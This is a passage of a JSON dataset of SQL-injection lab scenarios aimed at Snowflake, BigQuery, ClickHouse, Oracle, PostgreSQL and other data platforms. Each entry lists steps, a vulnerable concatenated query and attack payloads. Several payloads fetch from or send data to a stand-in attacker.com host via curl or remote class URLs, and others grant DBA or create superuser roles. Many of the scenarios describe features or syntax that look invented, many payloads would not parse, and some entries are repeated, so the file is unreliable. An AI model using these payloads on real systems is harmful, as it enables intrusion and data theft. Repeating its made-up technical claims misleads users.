      "Inject through connection properties",
      "Bypass driver validation",
      "Access restricted indices",
      "Exfiltrate via driver errors"
    ],
    "Vulnerability name": "Elasticsearch ODBC Injection",
    "srcCode": "Driver={{Elasticsearch ODBC}};Server='\\'' + userServer + '\\'';Properties='\\'' + userProps + '\\''",
    "payloads": [
      "attacker.com;UID=admin;PWD=' OR 1=1 --",
      "legit.com:9200\";SSL=1;SSLCertAuth=0;"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Apache Druid SQL Identifier Case Forcing",
    "Lab Description": "A dashboard tool forces identifier case with dynamic expressions. The case operations are concatenated directly into query planning.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify case manipulation",
      "Inject through case expressions",
      "Bypass parser validation",
      "Access system tables",
      "Execute native queries"
    ],
    "Vulnerability name": "Druid Case Forcing Injection",
    "srcCode": "SELECT * FROM '\\'' + userTable + '\\''",
    "payloads": [
      "datasource FROM (SELECT * FROM sys.segments) --",
      "SENSITIVE_DATA\" WHERE __time > 0) UNION SELECT 1 --"
    ]
  },
  {
    "Lab scenario": "SQL Injection in InfluxDB Flux HTTP Request Parameters",
    "Lab Description": "A monitoring system builds Flux HTTP requests with dynamic URLs. The request parameters are concatenated directly into pipeline execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify http.get/post calls",
      "Inject through URL parameters",
      "Bypass URL validation",
      "Access internal endpoints",
      "Exfiltrate via HTTP responses"
    ],
    "Vulnerability name": "Flux HTTP Injection",
    "srcCode": "import \"http\" http.get(url: '\\'' + userUrl + '\\'')",
    "payloads": [
      "attacker.com/exfil?data=${string(v: r._value)}",
      "localhost:8086/query?q=SHOW DATABASES"
    ]
  },
  {
    "Lab scenario": "SQL Injection in TimescaleDB Compression Segmentby Columns",
    "Lab Description": "A time-series database enables compression with dynamic segmentby columns. The column lists are concatenated directly into compression policies.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify ALTER TABLE SET compression",
      "Inject through segmentby parameters",
      "Bypass column validation",
      "Access compressed chunks",
      "Manipulate compression ratios"
    ],
    "Vulnerability name": "Timescale Compression Injection",
    "srcCode": "ALTER TABLE hypertable SET (timescaledb.compress, timescaledb.compress_segmentby = '\\'' + userColumns + '\\'')",
    "payloads": [
      "device_id') FROM _timescaledb_catalog.hypertable --",
      "time DESC')) WITH (compress_orderby = 'time DESC')"
    ]
  },
  {
    "Lab scenario": "SQL Injection in CockroachDB CDC Webhook Headers",
    "Lab Description": "A change data capture system configures webhooks with dynamic headers. The header values are concatenated directly into HTTP requests.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CREATE CHANGEFEED WITH webhook",
      "Inject through header parameters",
      "Bypass header validation",
      "Access webhook endpoints",
      "Exfiltrate via custom headers"
    ],
    "Vulnerability name": "Cockroach Webhook Header Injection",
    "srcCode": "CREATE CHANGEFEED FOR TABLE table INTO 'webhook-https://endpoint' WITH webhook_headers = '\\'' + userHeaders + '\\''",
    "payloads": [
      "'X-Auth: attacker'",
      "'{\"Authorization\": \"Bearer $(curl attacker.com)\"}'"
    ]
  },
  {
    "Lab scenario": "SQL Injection in DuckDB HTTPFS Extension Headers",
    "Lab Description": "A data pipeline uses DuckDB's HTTPFS with dynamic request headers. The header strings are concatenated directly into HTTP operations.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify HTTPFS usage",
      "Inject through header parameters",
      "Bypass header validation",
      "Access restricted URLs",
      "Exfiltrate via server responses"
    ],
    "Vulnerability name": "DuckDB HTTPFS Header Injection",
    "srcCode": "SET http_headers = '\\'' + userHeaders + '\\''",
    "payloads": [
      "'Authorization: Basic YWRtaW46cGFzcw=='",
      "'X-Forwarded-For: 127.0.0.1'"
    ]
  },
  {
    "Lab scenario": "SQL Injection in BigQuery Remote Model Connection Strings",
    "Lab Description": "A machine learning system creates remote models with dynamic connections. The connection strings are concatenated directly into model inference.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify CREATE MODEL usage",
      "Inject through CONNECTION parameters",
      "Bypass IAM validation",
      "Access Vertex AI endpoints",
      "Execute arbitrary predictions"
    ],
    "Vulnerability name": "BigQuery Model Connection Injection",
    "srcCode": "CREATE MODEL `project.model` REMOTE WITH CONNECTION `\\'' + userConn + '\\''",
    "payloads": [
      "us.my-connection') FROM `region-us`.INFORMATION_SCHEMA.ROUTINES --",
      "attacker-proj.us.conn` OPTIONS (endpoint='attacker.com')"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Snowflake External Function Response Transformers",
    "Lab Description": "A cloud integration processes external function responses with dynamic transformers. The JavaScript code is concatenated directly into result handling.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CREATE EXTERNAL FUNCTION",
      "Inject through RESPONSE_TRANSFORMER",
      "Bypass sandbox restrictions",
      "Modify returned data",
      "Execute arbitrary SQL"
    ],
    "Vulnerability name": "Snowflake Response Transformer Injection",
    "srcCode": "CREATE EXTERNAL FUNCTION func() RETURNS VARIANT RESPONSE_TRANSFORMER = '\\'' + userTransformer + '\\''",
    "payloads": [
      "function transform(res) { return {sqlText: 'SELECT * FROM sensitive_table'}; }",
      "res => res.map(row => ({...row, extra: execute('SHOW PARAMETERS')}))"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Databricks Asset Bundle Runtime Parameters",
    "Lab Description": "A deployment pipeline configures Databricks bundles with dynamic runtime args. The parameter strings are concatenated directly into job execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify bundle.yml usage",
      "Inject through runtime parameters",
      "Bypass YAML validation",
      "Access cluster environment",
      "Execute arbitrary notebooks"
    ],
    "Vulnerability name": "Databricks Bundle Injection",
    "srcCode": "resources: jobs: my_job: runtime_params: '\\'' + userParams + '\\''",
    "payloads": [
      "key:value') FROM system.bundles --",
      "malicious: $(cat /etc/passwd)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Trino Iceberg Metadata Procedures",
    "Lab Description": "A data lakehouse executes Iceberg procedures with dynamic arguments. The parameters are concatenated directly into metadata operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CALL iceberg.system usage",
      "Inject through procedure arguments",
      "Bypass namespace validation",
      "Tamper with table metadata",
      "Access underlying files"
    ],
    "Vulnerability name": "Trino Iceberg Procedure Injection",
    "srcCode": "CALL iceberg.system.procedure('\\'' + userArgs + '\\'')",
    "payloads": [
      "snapshots') FROM iceberg.information_schema.tables --",
      "expire_snapshots(table => 'sensitive'))"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Presto Thrift UDF Payloads",
    "Lab Description": "A distributed system registers Thrift UDFs with dynamic serialization. The payload strings are concatenated directly into function execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify Thrift UDF registration",
      "Inject through serialized payloads",
      "Bypass deserialization checks",
      "Execute arbitrary code",
      "Access worker nodes"
    ],
    "Vulnerability name": "Presto Thrift UDF Injection",
    "srcCode": "CREATE FUNCTION my_func RETURNS string TYPE thrift LANGUAGE thrift HANDLER '\\'' + userHandler + '\\''",
    "payloads": [
      "attacker.com:8080/Exploit.class",
      "java -jar malicious.jar"
    ]
  },
  {
    "Lab scenario": "SQL Injection in ClickHouse Kafka Engine Settings",
    "Lab Description": "A streaming pipeline creates Kafka tables with dynamic engine settings. The configuration strings are concatenated directly into consumer initialization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify CREATE TABLE ENGINE=Kafka",
      "Inject through settings parameters",
      "Bypass broker validation",
      "Access unauthorized topics",
      "Poison message streams"
    ],
    "Vulnerability name": "ClickHouse Kafka Injection",
    "srcCode": "CREATE TABLE kafka_table ENGINE = Kafka('\\'' + userSettings + '\\'')",
    "payloads": [
      "attacker.com:9092') FROM system.kafka_tables --",
      "legit:9092, topic=secret')) SETTINGS kafka_skip_broken_messages=1"
    ]
  },
  {
    "Lab scenario": "SQL Injection in PostgreSQL CREATE TEXT SEARCH PARSER",
    "Lab Description": "A search engine dynamically creates text parsers with vulnerable configuration. The parser commands are concatenated directly into dictionary creation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CREATE TEXT SEARCH PARSER",
      "Inject through startup/lexize functions",
      "Bypass C function validation",
      "Execute arbitrary code",
      "Compromise search indexes"
    ],
    "Vulnerability name": "PostgreSQL Text Parser Injection",
    "srcCode": "CREATE TEXT SEARCH PARSER my_parser (START = '\\'' + userStartFunc + '\\'', LEXIZE = '\\'' + userLexizeFunc + '\\'')",
    "payloads": [
      "shell_exec,'/bin/sh') FROM pg_ts_parser--",
      "system,'curl attacker.com')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in MySQL MEMORY Table Index Comments",
    "Lab Description": "A caching system creates MEMORY tables with dynamic index comments. The comment text is concatenated directly into index creation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify COMMENT clause in indexes",
      "Inject through index metadata",
      "Bypass comment length limits",
      "Store malicious payload in memory",
      "Trigger via table scans"
    ],
    "Vulnerability name": "MySQL MEMORY Table Injection",
    "srcCode": "CREATE TABLE cache (id INT, INDEX idx (id) COMMENT '\\'' + userComment + '\\'') ENGINE=MEMORY",
    "payloads": [
      "test') FROM information_schema.tables--",
      "'||(SELECT GROUP_CONCAT(user) FROM mysql.user)--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in SQL Server Graph SHORTEST_PATH Node Filters",
    "Lab Description": "A recommendation engine builds graph queries with dynamic node properties. The property filters are concatenated directly into pathfinding.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify SHORTEST_PATH usage",
      "Inject through node property filters",
      "Bypass graph traversal limits",
      "Access unauthorized nodes",
      "Exfiltrate relationship data"
    ],
    "Vulnerability name": "SQL Graph Path Injection",
    "srcCode": "MATCH SHORTEST_PATH((n {prop: '\\'' + userFilter + '\\''})-[*]->(m))",
    "payloads": [
      "1' OR 1=1)--",
      "valid'}) WHERE EXISTS(SELECT * FROM sys.sql_logins)--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Oracle DBMS_AQADM Queue Tables",
    "Lab Description": "A messaging system creates AQ queues with dynamic queue tables. The table parameters are concatenated directly into queue creation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify DBMS_AQADM.CREATE_QUEUE_TABLE",
      "Inject through queue_table parameter",
      "Bypass queue validation",
      "Access message payloads",
      "Tamper with queue storage"
    ],
    "Vulnerability name": "Oracle AQ Queue Injection",
    "srcCode": "BEGIN DBMS_AQADM.CREATE_QUEUE_TABLE('\\'' + userTable + '\\''); END;",
    "payloads": [
      "legit_queue') FROM all_queues--",
      "malicious_queue')); EXECUTE IMMEDIATE 'GRANT DBA TO attacker'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Snowflake STREAMS Table Filters",
    "Lab Description": "A CDC pipeline creates streams with dynamic table filters. The filter conditions are concatenated directly into change tracking.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify CREATE STREAM usage",
      "Inject through filter expressions",
      "Bypass change validation",
      "Access unauthorized changes",
      "Exfiltrate via stream content"
    ],
    "Vulnerability name": "Snowflake Stream Filter Injection",
    "srcCode": "CREATE STREAM my_stream ON TABLE target_table WHERE ('\\'' + userFilter + '\\'')",
    "payloads": [
      "1=1) FROM information_schema.streams--",
      "id>0)) APPEND_ONLY=TRUE--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in BigQuery JSON_EXTRACT Path Parameters",
    "Lab Description": "A JSON processing system extracts values with dynamic path expressions. The paths are concatenated directly into JSON parsing.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify JSON_EXTRACT usage",
      "Inject through path parameters",
      "Bypass JSON validation",
      "Access unauthorized fields",
      "Exfiltrate via malformed JSON"
    ],
    "Vulnerability name": "BigQuery JSON Path Injection",
    "srcCode": "SELECT JSON_EXTRACT(json_col, '\\'' + userPath + '\\'') FROM dataset.table",
    "payloads": [
      "$.private\") FROM `project.dataset.sensitive`--",
      "$[0]')) WHERE 1=0 UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Azure Synapse CETAS Partition Clauses",
    "Lab Description": "A data export feature uses CETAS with dynamic partition keys. The partition expressions are concatenated directly into file writing.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CREATE EXTERNAL TABLE AS",
      "Inject through PARTITION BY",
      "Bypass path validation",
      "Manipulate file output structure",
      "Exfiltrate via partition folders"
    ],
    "Vulnerability name": "Synapse CETAS Partition Injection",
    "srcCode": "CREATE EXTERNAL TABLE ext_data WITH (PARTITION ('\\'' + userPartition + '\\'')) AS SELECT * FROM source",
    "payloads": [
      "col1='value'') FROM sys.external_tables--",
      "date='2023-01-01')) UNION SELECT * FROM sys.sql_logins--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Databricks SQL Alias Expressions",
    "Lab Description": "A dashboard tool creates column aliases with dynamic expressions. The alias definitions are concatenated directly into query execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify column aliases",
      "Inject through AS clauses",
      "Bypass alias validation",
      "Access unauthorized columns",
      "Exfiltrate via renamed columns"
    ],
    "Vulnerability name": "Databricks Alias Injection",
    "srcCode": "SELECT col1 AS '\\'' + userAlias + '\\'' FROM table",
    "payloads": [
      "legit_name\") FROM system.information_schema.columns--",
      "malicious' FROM (SELECT * FROM hive_metastore.default.secrets)--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Amazon Redshift Spectrum External Table Locations",
    "Lab Description": "A data lake query system creates Spectrum tables with dynamic S3 paths. The location strings are concatenated directly into external table definitions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify CREATE EXTERNAL TABLE",
      "Inject through LOCATION clauses",
      "Bypass IAM validation",
      "Access unauthorized buckets",
      "Exfiltrate via S3"
    ],
    "Vulnerability name": "Redshift Spectrum Location Injection",
    "srcCode": "CREATE EXTERNAL TABLE spectrum_table (col1 INT) LOCATION '\\'' + userPath + '\\''",
    "payloads": [
      "s3://legit-bucket/path') FROM svv_external_tables--",
      "s3://attacker/exfil')) WITH (format='PARQUET')"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Google Cloud Spanner Foreign Key Constraints",
    "Lab Description": "A schema migration tool adds foreign keys with dynamic constraint checks. The constraint clauses are concatenated directly into DDL.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify ALTER TABLE ADD CONSTRAINT",
      "Inject through FOREIGN KEY clauses",
      "Bypass referential validation",
      "Disable constraint checking",
      "Corrupt relationships"
    ],
    "Vulnerability name": "Spanner FK Constraint Injection",
    "srcCode": "ALTER TABLE child ADD CONSTRAINT fk_name FOREIGN KEY ('\\'' + userColumn + '\\'') REFERENCES parent(col)",
    "payloads": [
      "id\") FROM information_schema.referential_constraints--",
      "fake_col'))) ON DELETE CASCADE"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Azure Data Explorer Kusto Function Defaults",
    "Lab Description": "A KQL query system creates functions with dynamic default parameters. The default expressions are concatenated directly into function execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify .create function usage",
      "Inject through default values",
      "Bypass parameter validation",
      "Access unauthorized data",
      "Execute arbitrary KQL"
    ],
    "Vulnerability name": "Kusto Function Default Injection",
    "srcCode": ".create function my_func(p:string = '\\'' + userDefault + '\\'') { ... }",
    "payloads": [
      "test') FROM .show functions--",
      "' || cluster('attacker').database('exfil').table('dump') || '"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Elasticsearch SQL ODBC Driver Connection Strings",
    "Lab Description": "An analytics tool builds ODBC connections with dynamic properties. The connection strings are concatenated directly into driver initialization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify ODBC connection points",
      "Inject through connection properties",
      "Bypass driver validation",
      "Access restricted indices",
      "Exfiltrate via driver errors"
    ],
    "Vulnerability name": "Elasticsearch ODBC Injection",
    "srcCode": "Driver={{Elasticsearch ODBC}};Server='\\'' + userServer + '\\'';Properties='\\'' + userProps + '\\''",
    "payloads": [
      "attacker.com;UID=admin;PWD=' OR 1=1 --",
      "legit.com:9200\";SSL=1;SSLCertAuth=0;"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Apache Druid SQL Identifier Escaping",
    "Lab Description": "A dashboard builder dynamically escapes Druid SQL identifiers. The escape sequences are concatenated directly into query planning.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify dynamic identifier usage",
      "Inject through escape sequences",
      "Bypass SQL parser validation",
      "Access system metadata tables",
      "Execute native Druid queries"
    ],
    "Vulnerability name": "Druid Identifier Escape Injection",
    "srcCode": "SELECT * FROM \"\\'' + userTable + '\\''",
    "payloads": [
      "datasource\\\" FROM (SELECT * FROM sys.segments) x--",
      "legit_table\\\" WHERE __time > 0) UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in InfluxDB Flux String Interpolation",
    "Lab Description": "A monitoring system builds Flux queries with dynamic string interpolation. The template strings are concatenated directly into pipeline construction.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify string interpolation points",
      "Inject through template literals",
      "Bypass Flux validation",
      "Modify query logic",
      "Access system buckets"
    ],
    "Vulnerability name": "Flux Interpolation Injection",
    "srcCode": "from(bucket: \"metrics\") |> filter(fn: (r) => \"\\'' + userFilter + '\\''\")",
    "payloads": [
      "r._value > 0\") FROM (SELECT * FROM sql_metrics)--",
      "1==1) UNION SELECT * FROM _internal.monitor--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in TimescaleDB Continuous Aggregate Policies",
    "Lab Description": "A time-series platform configures continuous aggregates with dynamic refresh policies. The policy parameters are concatenated directly into materialized view maintenance.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify add_continuous_aggregate_policy",
      "Inject through schedule parameters",
      "Trigger materialization jobs",
      "Bypass time bucket validation",
      "Compromise hypertable data"
    ],
    "Vulnerability name": "Timescale Policy Injection",
    "srcCode": "SELECT add_continuous_aggregate_policy('\\'' + userView + '\\'', '\\'' + userInterval + '\\'')",
    "payloads": [
      "my_view', INTERVAL '1 hour')) FROM _timescaledb_catalog.hypertable--",
      "sensitive_view', INTERVAL '1 day'))) RETURNING *--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in CockroachDB Changefeed Filters",
    "Lab Description": "A CDC pipeline creates changefeeds with dynamic filter expressions. The filters are concatenated directly into change event generation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify changefeed creation",
      "Inject through filter parameter",
      "Trigger change events",
      "Bypass CDC validation",
      "Exfiltrate via webhook payloads"
    ],
    "Vulnerability name": "CockroachCDC Filter Injection",
    "srcCode": "CREATE CHANGEFEED FOR TABLE users WITH filter = '\\'' + userFilter + '\\''",
    "payloads": [
      "SELECT * FROM users WHERE type = 'admin'--",
      "SELECT *, (SELECT version()) FROM users--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in DuckDB S3 Endpoint Configuration",
    "Lab Description": "A data pipeline configures DuckDB's S3 extension with dynamic endpoints. The connection strings are concatenated directly into cloud storage operations.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify S3 configuration points",
      "Inject through endpoint parameters",
      "Bypass URL validation",
      "Modify remote data access",
      "Exfiltrate credentials"
    ],
    "Vulnerability name": "DuckDB S3 Endpoint Injection",
    "srcCode": "SET s3_endpoint='\\'' + userEndpoint + '\\''",
    "payloads": [
      "attacker.com') FROM (SELECT * FROM duckdb_settings)--",
      "legit.s3.amazonaws.com'; COPY (SELECT * FROM sqlite_master) TO 's3://exfil/'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Materialized View WITH NO DATA Clause",
    "Lab Description": "A data warehouse creates materialized views with dynamic data loading options. The WITH clauses are concatenated directly into view creation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify materialized view creation",
      "Inject through WITH DATA parameter",
      "Trigger view population",
      "Bypass data validation",
      "Modify view contents"
    ],
    "Vulnerability name": "Materialized View Data Clause Injection",
    "srcCode": "CREATE MATERIALIZED VIEW mv AS SELECT * FROM source ('\\'' + userDataOption + '\\'')",
    "payloads": [
      "WITH NO DATA) FROM (SELECT * FROM pg_matviews) x--",
      "WITH DATA) WHERE 1=0 UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in SQL Server Ledger View Options",
    "Lab Description": "A blockchain application uses SQL Server Ledger with dynamic view parameters. The options are concatenated directly into ledger view creation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify ledger view creation",
      "Inject through view options",
      "Trigger ledger verification",
      "Bypass blockchain validation",
      "Modify historical records"
    ],
    "Vulnerability name": "SQL Ledger View Injection",
    "srcCode": "CREATE LEDGER VIEW ledger_view WITH (LEDGER_VIEW = ON, '\\'' + userOptions + '\\'')",
    "payloads": [
      "VERIFICATION = ON) FROM (SELECT * FROM sys.database_principals) x--",
      "TRANSACTION_ID_COLUMN = id) WHERE 1=0 UNION SELECT 1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Google BigQuery Wildcard Table Patterns",
    "Lab Description": "A data analytics tool uses BigQuery wildcard tables with dynamic patterns. The table patterns are concatenated directly into FROM clauses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify wildcard table usage",
      "Inject through table pattern",
      "Bypass pattern validation",
      "Access unauthorized datasets",
      "Exfiltrate via table expansion"
    ],
    "Vulnerability name": "BigQuery Wildcard Injection",
    "srcCode": "SELECT * FROM `project.dataset.\\'' + userPattern + '\\'`",
    "payloads": [
      "table_*` FROM (SELECT * FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA) x--",
      "legit_table` WHERE _TABLE_SUFFIX = '') UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Databricks SQL Warehouse Configurations",
    "Lab Description": "A Databricks environment configures SQL warehouses with dynamic parameters. The configuration strings are concatenated directly into warehouse creation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify warehouse creation endpoints",
      "Inject through config parameters",
      "Trigger warehouse startup",
      "Bypass config validation",
      "Access metastore via driver nodes"
    ],
    "Vulnerability name": "Databricks Warehouse Config Injection",
    "srcCode": "CREATE WAREHOUSE my_warehouse WITH ('\\'' + userConfig + '\\'')",
    "payloads": [
      "AUTO_STOP = 1200) FROM (SELECT * FROM system.metastore.tables)--",
      "CLUSTER_SIZE = 'Small'); SELECT * FROM hive_metastore.default.secrets--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Trino Function Namespace Paths",
    "Lab Description": "A Trino cluster creates functions with dynamic namespace paths. The namespace strings are concatenated directly into function registration.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify function creation endpoints",
      "Inject through namespace parameters",
      "Trigger function execution",
      "Bypass namespace validation",
      "Access system functions"
    ],
    "Vulnerability name": "Trino Function Namespace Injection",
    "srcCode": "CREATE FUNCTION '\\'' + userNamespace + '\\''.my_func() RETURNS STRING",
    "payloads": [
      "system', 'return 1') FROM (SELECT * FROM system.metadata.catalogs)--",
      "pg_catalog', 'SELECT * FROM pg_user')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Presto Table Function Arguments",
    "Lab Description": "A Presto cluster uses table functions with dynamic arguments. The argument strings are concatenated directly into function calls.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify table function usage",
      "Inject through function arguments",
      "Bypass argument validation",
      "Modify generated table contents",
      "Access system tables via function errors"
    ],
    "Vulnerability name": "Presto Table Function Injection",
    "srcCode": "SELECT * FROM TABLE(system.query(query => '\\'' + userQuery + '\\''))",
    "payloads": [
      "SELECT 1')) FROM (SELECT * FROM system.runtime.nodes)--",
      "SELECT * FROM tpch.sf1.customer')) WHERE 1=0 UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in ClickHouse Dictionary Source URLs",
    "Lab Description": "A ClickHouse cluster configures external dictionaries with dynamic source URLs. The URLs are concatenated directly into dictionary definitions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify dictionary creation",
      "Inject through source URL parameters",
      "Trigger dictionary reload",
      "Bypass URL validation",
      "Modify dictionary contents"
    ],
    "Vulnerability name": "ClickHouse Dictionary URL Injection",
    "srcCode": "CREATE DICTIONARY my_dict (SOURCE(HTTP(URL '\\'' + userUrl + '\\'')))",
    "payloads": [
      "http://attacker.com/payload')) FROM (SELECT * FROM system.dictionaries)--",
      "https://legit.com/data.json')) WHERE 1=0 UNION SELECT 1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in PostgreSQL CREATE COLLATION Locale",
    "Lab Description": "A multilingual app creates custom collations with dynamic locale strings. The locale parameters are concatenated directly into collation definitions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify CREATE COLLATION usage",
      "Inject through locale parameter",
      "Bypass locale validation",
      "Trigger collation corruption",
      "Exfiltrate via string comparisons"
    ],
    "Vulnerability name": "PostgreSQL Collation Injection",
    "srcCode": "CREATE COLLATION my_coll (LOCALE = '\\'' + userLocale + '\\'')",
    "payloads": [
      "en_US.utf8') FROM pg_collation--",
      "C')); CREATE ROLE attacker SUPERUSER--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in MySQL Clone Plugin Data Filtering",
    "Lab Description": "A database cloning tool uses dynamic filters during clone operations. The filter conditions are concatenated directly into clone statements.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CLONE INSTANCE usage",
      "Inject through DATA FILTER clauses",
      "Bypass clone validation",
      "Access source server data",
      "Tamper with cloned content"
    ],
    "Vulnerability name": "MySQL Clone Filter Injection",
    "srcCode": "CLONE INSTANCE FROM user@host DATA FILTER = '\\'' + userFilter + '\\''",
    "payloads": [
      "EXCLUDE_SCHEMAS: ['mysql'] FROM clone_progress--",
      "INCLUDE_TABLES: ['sensitive.%']))--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in SQL Server Ledger History Retention",
    "Lab Description": "A blockchain system configures ledger history with dynamic retention periods. The retention clauses are concatenated directly into immutable storage.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify ALTER LEDGER usage",
      "Inject through retention parameters",
      "Bypass blockchain validation",
      "Purge historical records",
      "Tamper with audit trails"
    ],
    "Vulnerability name": "SQL Ledger Retention Injection",
    "srcCode": "ALTER LEDGER ledger_name SET (LEDGER_RETENTION = '\\'' + userRetention + '\\'')",
    "payloads": [
      "INFINITE') FROM sys.ledger_blocks--",
      "0 DAYS'))) WITH (VERIFICATION = OFF)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Oracle SDO_NET Memory Parameters",
    "Lab Description": "A network analysis tool configures spatial networks with dynamic memory settings. The parameter strings are concatenated directly into network creation.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify SDO_NET.CREATE_NETWORK",
      "Inject through memory parameters",
      "Bypass SGA validation",
      "Trigger buffer overflows",
      "Execute arbitrary PL/SQL"
    ],
    "Vulnerability name": "Oracle SDO_NET Injection",
    "srcCode": "BEGIN SDO_NET.CREATE_NETWORK('\\'' + userParams + '\\''); END;",
    "payloads": [
      "network_name, no_of_nodes, no_of_links, no_of_paths, no_of_pathtables FROM user_sdo_networks--",
      "malicious_net')); EXECUTE IMMEDIATE 'GRANT DBA TO attacker'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Snowflake External Table Refresh Paths",
    "Lab Description": "A cloud pipeline refreshes external tables with dynamic storage paths. The path strings are concatenated directly into metadata updates.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify ALTER EXTERNAL TABLE REFRESH",
      "Inject through location parameters",
      "Bypass path validation",
      "Access unauthorized storage",
      "Poison metadata cache"
    ],
    "Vulnerability name": "Snowflake External Path Injection",
    "srcCode": "ALTER EXTERNAL TABLE ext_table REFRESH '\\'' + userPath + '\\''",
    "payloads": [
      "s3://legit/path') FROM information_schema.external_tables--",
      "azure://attacker/exfil')) LIST @~/staged"
    ]
  },
  {
    "Lab scenario": "SQL Injection in BigQuery Remote Model Connection Strings",
    "Lab Description": "A machine learning system creates remote models with dynamic connections. The connection strings are concatenated directly into model inference.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify CREATE MODEL usage",
      "Inject through CONNECTION parameters",
      "Bypass IAM validation",
      "Access Vertex AI endpoints",
      "Execute arbitrary predictions"
    ],
    "Vulnerability name": "BigQuery Model Connection Injection",
    "srcCode": "CREATE MODEL `project.model` REMOTE WITH CONNECTION `\\'' + userConn + '\\''",
    "payloads": [
      "us.my-connection') FROM `region-us`.INFORMATION_SCHEMA.ROUTINES--",
      "attacker-proj.us.conn` OPTIONS (endpoint='attacker.com')"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Azure Synapse Spark Notebook Magic Parameters",
    "Lab Description": "A Synapse notebook uses dynamic parameters in magic commands. The values are concatenated directly into command execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify magic command usage (%sql, %python)",
      "Inject through parameter placeholders",
      "Bypass notebook sanitization",
      "Execute cross-language code",
      "Access linked services"
    ],
    "Vulnerability name": "Synapse Magic Command Injection",
    "srcCode": "%sql SELECT * FROM table WHERE id = '\\'' + userParam + '\\''",
    "payloads": [
      "1' UNION SELECT * FROM sensitive_table--",
      "' || (SELECT TOP 1 name FROM sys.sql_logins) || '"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Amazon Redshift ML Model Hyperparameters",
    "Lab Description": "A predictive analytics system trains ML models with dynamic hyperparameters. The parameter strings are concatenated directly into model creation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CREATE MODEL usage",
      "Inject through HPARAMETERS clauses",
      "Bypass SageMaker validation",
      "Access training data",
      "Manipulate model behavior"
    ],
    "Vulnerability name": "Redshift ML Hyperparameter Injection",
